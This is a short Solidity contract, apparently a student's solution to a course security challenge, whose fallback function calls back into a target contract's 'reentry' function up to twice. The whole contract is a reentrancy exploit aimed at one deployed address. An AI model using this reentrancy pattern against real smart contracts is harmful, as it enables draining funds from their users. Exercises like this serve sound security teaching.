/**
 *Submitted for verification at Etherscan.io on 2022-06-15
*/

pragma solidity ^0.4.22;

// import "./CNSChallenge.sol";

contract CNSReentry {
    address challenge = 0xC0770a88816Ff575960928AA0AAe0AB0d727d3F6;
    // CNSChallenge challange = CNSChallenge(msg.sender);
    uint count = 0;
    string id = "ntnu_40747040s";

    function () public {
        if (count < 2) {
            count += 1;
            bool success = challenge.call(bytes4(keccak256("reentry(string studentID)")), id);
            // CNSChallenge(msg.sender).reentry(id);
            require(success);
        }
    }
}